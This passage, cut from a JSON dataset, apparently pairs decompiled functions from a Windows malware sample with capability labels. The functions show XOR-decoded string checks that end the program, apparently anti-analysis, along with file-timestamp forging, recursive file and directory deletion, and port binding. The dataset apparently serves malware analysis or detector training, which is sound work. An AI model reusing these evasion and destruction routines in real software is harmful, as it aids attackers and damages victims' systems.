*0x41c234 = var_a0h;\n    *0x41c238 = var_98h;\n    *0x41c240 = var_84h;\n    do {\n        iVar5 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41be10, *(uVar11 + 0x41c220));\n        if (iVar5 != 0) {\n            fcn.0040d23b();\n        }\n        uVar11 = uVar11 + 4;\n    } while (uVar11 < 0x20);\n    var_24h = 0x14522364;\n    var_20h = 0x5d5a1605;\n    var_1ch._0_2_ = 0x6039;\n    var_1ch._2_1_ = 0x14;\n    var_1ch._3_1_ = 0x18;\n    var_18h._0_1_ = 0x27;\n    var_18h._1_1_ = 0x5a;\n    var_18h._2_1_ = 0x5d;\n    var_18h._3_1_ = 0x24;\n    var_14h = 0x36;\n    var_8h._0_2_ = 0x4a32;\n    var_8h._2_1_ = 0x36;\n    var_8h._3_1_ = 0x71;\n    var_4h._0_1_ = 0x6a;\n    var_4h._1_1_ = 0x54;\n    var_4h._2_1_ = 0x33;\n    fcn.00401000(0x11);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_60h;\n        iVar9 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_24h - var_60h];\n    } while (iVar5 < 0x11);\n    cVar4 = fcn.0040d051(var_60h, var_60h);\n    if (cVar4 == '\\0') {\n        fcn.0040d23b();\n    }\n    var_1ch._0_2_ = 0x1f34;\n    var_1ch._2_1_ = 2;\n    var_1ch._3_1_ = 2;\n    var_18h._0_1_ = 0x25;\n    var_18h._1_1_ = 0x59;\n    var_18h._2_1_ = 0x18;\n    var_18h._3_1_ = 0x20;\n    var_14h = 0x19;\n    uStack23 = 8;\n    var_12h._0_1_ = 0x76;\n    var_8h._0_2_ = 0x7662;\n    var_8h._2_1_ = 0x70;\n    var_8h._3_1_ = 0x76;\n    var_4h._0_1_ = 0x50;\n    var_4h._1_1_ = 0x38;\n    var_4h._2_1_ = 0x74;\n    fcn.00401000(0xb);\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + var_64h;\n        iVar9 = iVar5 % var_58h;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_8h + iVar9) ^ puVar1[&var_1ch - var_64h];\n        pcVar2 = _sym.imp.SHLWAPI.dll_StrStrA;\n    } while (iVar5 < 0xb);\n    iVar5 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41be10, var_64h);\n    if (iVar5 != 0) {\n        fcn.0040d23b();\n    }\n    var_54h = 0x660c2e24;\n    var_50h = 0x3c01132f;\n    var_4ch = 0x51232c2b;\n    var_48h = 0x16203d0a;\n    var_44h = 0x65161511;\n    var_40h._0_1_ = 0x11;\n    var_40h._1_1_ = 0x3c;\n    var_40h._2_2_ = 0x1637;\n    var_3ch = 0x1200;\n    var_3ah._0_2_ = 0x7116;\n    var_3ah._2_2_ = 0x200d;\n    var_36h._0_2_ = 0x1c21;\n    var_36h._2_2_ = 0x1519;\n    var_32h._0_2_ = 0x571c;\n    var_32h._2_2_ = 0x210a;\n    var_2eh._0_2_ = 0x163a;\n    var_2eh._2_2_ = 0x6119;\n    var_8h._0_2_ = 0x6177;\n    var_8h._2_1_ = 0x4a;\n    var_8h._3_1_ = 0x32;\n    var_4h._0_1_ = 0x78;\n    var_4h._1_1_ = 0x52;\n    var_4h._2_1_ = 0x53;\n    var_4h._3_1_ = 0x79;\n    fcn.00401000(0x2a);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_ach;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = *(&var_8h + uVar8) ^ puVar1[&var_54h - var_ach];\n        uVar8 = uVar8 & 0xffffff00 | uVar7;\n        uVar11 = uVar11 + 1;\n        *puVar1 = uVar7;\n    } while (uVar11 < 0x2a);\n    cVar4 = fcn.0040d051(uVar8, uVar8);\n    if (cVar4 == '\\0') {\n        fcn.0040d23b();\n    }\n    var_28h = 0x5c5e526c;\n    var_24h = 0x41657d5f;\n    var_20h = 0x5d5e4a69;\n    var_1ch._0_2_ = 0x635c;\n    var_1ch._2_1_ = 99;\n    var_1ch._3_1_ = 0x43;\n    var_18h._0_1_ = 0x6d;\n    var_18h._1_1_ = 0x4a;\n    var_18h._2_1_ = 0x5e;\n    var_18h._3_1_ = 0x58;\n    var_14h = 0x52;\n    uStack23 = 0x65;\n    var_12h._0_1_ = 99;\n    var_12h._1_1_ = 0x75;\n    var_8h._0_2_ = 0x6759;\n    var_8h._2_1_ = 0x6c;\n    var_8h._3_1_ = 0x6b;\n    var_4h._0_1_ = 0x6b;\n    var_4h._1_1_ = 0x50;\n    var_4h._2_1_ = 0x53;\n    var_4h._3_1_ = 0x75;\n    fcn.00401000(0x18);\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + var_58h;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_8h + uVar8) ^ puVar1[&var_28h - var_58h];\n    } while (uVar11 < 0x18);\n    iVar5 = (*pcVar2)(0x41be10, var_58h);\n    if (iVar5 != 0) {\n        fcn.0040d23b();\n    }\n    var_44h = 0x5d4d5c5a;\n    var_40h._0_1_ = 0x7d;\n    var_40h._1_1_ = 0x75;\n    var_40h._2_2_ = 0x4264;\n    var_3ch = 0x4759;\n    var_3ah._0_2_ = 0x544a;\n    var_3ah._2_2_ = 0x6f7d;\n    var_36h._0_2_ = 0x4562;\n    var_36h._2_2_ = 0x475a;\n    var_32h._0_2_ = 0x564b;\n    var_32h._2_2_ = 0x697f;\n    var_2eh._0_2_ = 0x7662;\n    var_18h._0_1_ = 0x6d;\n    var_18h._1_1_ = 0x6a;\n    var_18h._2_1_ = 0x79;\n    var_18h._3_1_ = 0x65;\n    var_14h = 0x4a;\n    uStack23 = 0x58;\n    var_12h._0_1_ = 0x52;\n    var_12h._1_1_ = 0x76;\n    fcn.00401000(0x18);\n    iVar5 = CONCAT13(var_4h._3_1_, CONCAT12(var_4h._2_1_, CONCAT11(var_4h._1_1_, var_4h)));\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + iVar5;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_18h + uVar8) ^ puVar1[&var_44h - iVar5];\n    } while (uVar11 < 0x18);\n    iVar9 = (*pcVar2)(0x41be10, iVar5);\n    if (iVar9 != 0) {\n        fcn.0040d23b();\n    }\n    var_44h = 0x79535863;\n    var_40h._0_1_ = 5;\n    var_40h._1_1_ = 0x55;\n    var_40h._2_2_ = 0x6b65;\n    var_3ch = 0x4363;\n    var_3ah._0_2_ = 0x755f;\n    var_3ah._2_2_ = 0x4100;\n    var_36h._0_2_ = 0x6d6f;\n    var_36h._2_2_ = 0x4361;\n    var_32h._0_2_ = 0x7355;\n    var_32h._2_2_ = 0x4904;\n    var_2eh._0_2_ = 0x5862;\n    var_18h._0_1_ = 0x54;\n    var_18h._1_1_ = 0x6e;\n    var_18h._2_1_ = 0x67;\n    var_18h._3_1_ = 0x41;\n    var_14h = 0x32;\n    uStack23 = 0x78;\n    var_12h._0_1_ = 0x56;\n    var_12h._1_1_ = 0x58;\n    fcn.00401000(0x18);\n    iVar9 = CONCAT13(var_4h._3_1_, CONCAT12(var_4h._2_1_, CONCAT11(var_4h._1_1_, var_4h)));\n    uVar11 = 0;\n    do {\n        puVar1 = uVar11 + iVar9;\n        uVar8 = uVar11 & 0x80000007;\n        if (uVar8 < 0) {\n            uVar8 = (uVar8 - 1 | 0xfffffff8) + 1;\n        }\n        uVar11 = uVar11 + 1;\n        *puVar1 = *(&var_18h + uVar8) ^ puVar1[&var_44h - iVar9];\n    } while (uVar11 < 0x18);\n    iVar10 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41be10, iVar9);\n    if (iVar10 != 0) {\n        fcn.0040d23b();\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*pcVar3)(0, iVar5);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_58h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_ach);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_64h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_60h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_84h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_98h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_a0h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_9ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_7ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_80h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_88h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_8ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_90h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_6ch);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_74h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_a8h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_a4h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_b4h);\n    (*pcVar2)(uVar6);\n    uVar6 = (*pcVar3)(0, var_b0h);\n    uVar11 = (*pcVar2)(uVar6);\n    return uVar11 & 0xffffff00;\n}\n",
        "token_count": 9706
    },
    "00404bbf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.00404bbf(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    ushort uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint uStack484;\n    uint uStack480;\n    uchar *puStack476;\n    uint32_t uStack460;\n    uint32_t uStack456;\n    uint32_t uStack452;\n    uint uStack448;\n    uchar auStack408 [404];\n    \n    puStack476 = &stack0xfffffe68;\n    uStack480 = 0x202;\n    uStack484 = 0x404be0;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uVar4 = (*_sym.imp.WS2_32.dll_socket)(2, 1);\n    uStack456 = 0;\n    if (uVar4 != 0xffffffff) {\n        uStack452 = uVar4;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uStack456 = iVar5 + 2000U & 0xffff;\n        uVar4 = 0;\n        if (uStack456 < 64000) {\n            uStack480 = 0x47515947;\n            puStack476 = puStack476 & 0xff000000 | 0x324f71;\n            do {\n                fcn.00401000(10);\n                uVar2 = uStack452;\n                uVar4 = uStack456;\n                iVar5 = 0;\n                do {\n                    puVar1 = iVar5 + uStack452;\n                    iVar7 = iVar5 % 7;\n                    iVar5 = iVar5 + 1;\n                    *puVar1 = (&stack0xfffffe1c)[iVar7] ^ puVar1[&stack0xfffffe24 + -uStack452];\n                } while (iVar5 < 10);\n                uStack448 = (*_sym.imp.WS2_32.dll_inet_addr)(uStack452);\n                uVar3 = (*_sym.imp.WS2_32.dll_ntohs)(uStack460);\n                uStack456 = CONCAT22(uVar3, 2);\n                iVar5 = (*_sym.imp.WS2_32.dll_bind)(uVar4, &stack0xfffffe38, 0x10);\n                if (iVar5 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(uVar4);\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar2);\n                    uVar4 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                    uStack456 = uStack460;\n                    break;\n                }\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n                uStack456 = uStack460 + 1;\n                uVar4 = 0;\n            } while (uStack456 < 64000);\n        }\n    }\n    return uVar4 & 0xffff0000 | uStack456 & 0xffff;\n}\n",
        "token_count": 712
    },
    "00406008": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406008(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint uVar6;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar7 = 0;\n    iVar2 = fcn.00405f95();\n    if (iVar2 != 0) {\n        in_ECX = iVar2;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0x80000000, 1, 0, 3, 0x80, 0);\n    if (iVar3 != -1) {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetFileSize)(iVar3, 0);\n        if (iVar4 == 0) {\n            iVar4 = 0xe8;\n            goto code_r0x004060aa;\n        }\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4 + 2);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        if (iVar7 != 0) {\n            iVar5 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar3, iVar7, iVar4, &lpNumberOfBytesRead, 0);\n            if (iVar5 != 0) {\n                if (iVar4 == lpNumberOfBytesRead) {\n                    *(iVar4 + iVar7) = 0;\n                    *in_EDX = iVar7;\n                    *arg_8h = iVar4;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 0x1e;\n                }\n                goto code_r0x004060aa;\n            }\n        }\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x004060aa:\n    if (iVar3 != -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    if ((iVar7 != 0) && (iVar4 != 0)) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n        (*pcVar1)(uVar6);\n    }\n    if (iVar2 != 0) {\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar1)(uVar6);\n    }\n    return iVar4;\n}\n",
        "token_count": 603
    },
    "004060ec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004060ec(uint lpLastWriteTime)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint in_EDX;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_31h;\n    uchar var_2dh;\n    uint lpSystemTime;\n    uint var_26h;\n    int16_t var_22h;\n    int16_t var_20h;\n    int16_t var_1eh;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    \n    iVar8 = *0x41bcc0;\n    lpLastAccessTime = in_EDX;\n    (*_sym.imp.KERNEL32.dll_GetSystemTime)(&lpSystemTime);\n    pcVar2 = _sym.imp.KERNEL32.dll_SystemTimeToFileTime;\n    uVar7 = iVar8 * 0x19660d + 0x3c6ef35f;\n    lpSystemTime._2_2_ = uVar7 % 0xb + 1;\n    uVar7 = uVar7 * 0x19660d + 0x3c6ef35f;\n    uVar5 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_26h._0_2_ = uVar7 % 0x1b + 1;\n    var_26h._2_2_ = uVar5 % 0x16 + 1;\n    uVar7 = uVar5 * 0x19660d + 0x3c6ef35f;\n    uVar5 = uVar7 * 0x19660d + 0x3c6ef35f;\n    var_22h = uVar7 % 0x3b + 1;\n    var_20h = uVar5 % 0x3b + 1;\n    lpSystemTime._0_2_ = lpSystemTime + -1;\n    var_1eh = ((uVar5 * 0x19660d + 0x3c6ef35f) * 0x19660d + 0x3c6ef35f) % 0x3e6 + 1;\n    (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime);\n    (*pcVar2)(&lpSystemTime);\n    (*pcVar2)(&lpSystemTime, lpLastWriteTime);\n    var_60h = 0x57267467;\n    var_5ch = 0x420a5324;\n    var_58h = 0x4d3e5110;\n    var_54h = 0x74676421;\n    var_50h = 0x533e570d;\n    var_4ch._0_2_ = 0x421d;\n    var_14h = 7;\n    var_4ch._2_1_ = 7;\n    stack0xffffffb3 = 0x364d2351;\n    var_45h = 0x62742f64;\n    var_41h = 0x38537f57;\n    var_3dh = 0x3a511742;\n    var_39h = 0x6c64374d;\n    var_35h = 0x35573474;\n    var_31h = 0x74420153;\n    var_2dh = 0x51;\n    var_1ch = 0x57517442;\n    var_18h._0_2_ = 0x534d;\n    var_18h._2_1_ = 100;\n    fcn.00401000(0x68);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_10h;\n        iVar6 = iVar8 % var_14h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_1ch + iVar6) ^ puVar1[&var_60h - var_10h];\n    } while (iVar8 < 0x34);\n    iVar8 = fcn.00405f95();\n    if (iVar8 != 0) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_CreateFileW)(iVar8, 0x80000000, 1, 0, 3, 0, 0);\n        if ((iVar6 != 0) && (iVar6 != -1)) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar8, lpCreationTime, lpLastAccessTime, lpLastWriteTime);\n            if (iVar3 == 0) {\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpCreationTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastAccessTime);\n                (*_sym.imp.KERNEL32.dll_SystemTimeToFileTime)(&lpSystemTime, lpLastWriteTime);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar6);\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return 0;\n}\n",
        "token_count": 1346
    },
    "00406313": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406313(uint nNumberOfBytesToWrite)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint lpNumberOfBytesWritten;\n    uint lpBuffer;\n    \n    lpBuffer = in_EDX;\n    iVar1 = fcn.00405f95();\n    if (iVar1 != 0) {\n        in_ECX = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(in_ECX, 0xc0000000, 0, 0, 4, 0x80, 0);\n    if (iVar2 == -1) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        fcn.004060ec(&lpLastWriteTime);\n        iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n        if (iVar4 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            (*_sym.imp.KERNEL32.dll_SetEndOfFile)(iVar2);\n            uVar3 = 0;\n        }\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    if (iVar1 != 0) {\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return uVar3;\n}\n",
        "token_count": 427
    },
    "004063c7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004063c7(int32_t arg_8h)\n\n{\n    int16_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t in_ECX;\n    int32_t iVar12;\n    uint var_24h;\n    uint hFindFile;\n    uint lpString1;\n    uint var_18h;\n    uint lpString2;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint lpFindFileData;\n    \n    iVar12 = 8;\n    var_10h = 0x104;\n    iVar3 = fcn.00405f95();\n    if (iVar3 != 0) {\n        in_ECX = iVar3;\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(in_ECX);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    if (iVar6 != 0) {\n        uVar5 = (*pcVar2)(0, iVar4 * 2 + 0xc);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        if (iVar7 != 0) {\n            uVar5 = (*pcVar2)(0, 0x250);\n            puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n            if (puVar8 != NULL) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar6, in_ECX);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar6, 0x40faec);\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar7, in_ECX);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar7, 0x40faf0);\n                iVar9 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar7, puVar8);\n                if (iVar9 == -1) {\n                    iVar12 = 3;\n                }\n                else {\n                    iVar12 = 0;\n                    piVar1 = puVar8 + 0x2c;\n                    do {\n                        if (*piVar1 != 0x2e) {\n                            iVar10 = (*_sym.imp.KERNEL32.dll_lstrlenW)(piVar1);\n                            uVar11 = iVar10 + 2 + iVar4;\n                            if (var_10h < uVar11) {\n                                uVar5 = (*pcVar2)(0, iVar6);\n                                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n                                uVar5 = (*pcVar2)(0, uVar11 * 2);\n                                iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n                                if (iVar6 == 0) {\n                                    iVar12 = 8;\n                                    break;\n                                }\n                                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar6, in_ECX);\n                                (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar6, 0x40faec);\n                                var_10h = uVar11;\n                            }\n                            else {\n                                *(iVar6 + 2 + iVar4 * 2) = 0;\n                            }\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar6, piVar1);\n                            if ((*puVar8 & 0x10) == 0) {\n                                iVar10 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(iVar6);\n                            }\n                            else {\n                                iVar12 = fcn.004063c7(arg_8h);\n                                if (iVar12 != 0) break;\n                                iVar10 = (*_sym.imp.KERNEL32.dll_RemoveDirectoryW)(iVar6);\n                            }\n                            if ((iVar10 == 0) && (arg_8h == 0)) {\n                                iVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                break;\n                            }\n                        }\n                        iVar10 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar9, puVar8);\n                    } while (iVar10 != 0);\n                }\n                uVar5 = (*pcVar2)(0, puVar8);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            }\n            uVar5 = (*pcVar2)(0, iVar7);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        if (iVar6 != 0) {\n            uVar5 = (*pcVar2)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n    }\n    if (iVar3 != 0) {\n        uVar5 = (*pcVar2)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    }\n    return iVar12;\n}\n",
        "token_count": 1164
    },
    "004068eb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004068eb(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (param_1 != 0) {\n        if (param_2 == -1) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_2 + 1);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if ((iVar2 != 0) &&\n           (iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, param_2, iVar2, param_2 + 1, 0, 0), \n           iVar3 != 0)) {\n            var_4h = fcn.00406840();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 285
    },
    "00409606": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409606(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t iVar4;\n    int32_t lpBuffer;\n    int32_t lpNumberOfBytesRead;\n    uint lpFileName;\n    int32_t lDistanceToMove;\n    int32_t var_4h;\n    \n    iVar4 = 0;\n    var_4h = 0;\n    iVar2 = fcn.0040a423();\n    if (iVar2 == 0) {\n        iVar2 = fcn.00408bd8(extraout_ECX);\n        if ((iVar2 != 0) && (lDistanceToMove = fcn.00408c5e(),  lDistanceToMove != 0)) {\n            cVar1 = '\\0';\n            if (((*0x41bd38 & 1) != 0) && (*(*(param_1 + 0x3c) + 4 + param_1) == 0x14c)) {\n                cVar1 = fcn.004094b9();\n                cVar1 = '\\x01' - (cVar1 != '\\0');\n            }\n            iVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 1, 0, 3, 0x80, 0);\n            if (iVar4 != -1) {\n                iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointer)(iVar4, lDistanceToMove, 0, 0);\n                if (((iVar2 == lDistanceToMove) &&\n                    (iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar4, &lpBuffer, 4, &lpNumberOfBytesRead, 0), \n                    iVar2 != 0)) && (lpNumberOfBytesRead == 4)) {\n                    var_4h = lpBuffer + param_1;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            iVar4 = var_4h;\n            if (cVar1 != '\\0') {\n                fcn.004094b9();\n                iVar4 = var_4h;\n            }\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpFileName);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return iVar4;\n}\n",
        "token_count": 539
    },
    "0040c721": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c721(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    *0x41bdf0 = 1;\n    fcn.00404b98(param_1);\n    fcn.0040bf99();\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(*0x41bd3c);\n    if (iVar1 != -1) {\n        fcn.004065c5();\n    }\n    fcn.0040c302();\n    (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    fcn.0040c22a();\n    return;\n}\n",
        "token_count": 141
    },
    "004046b2": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
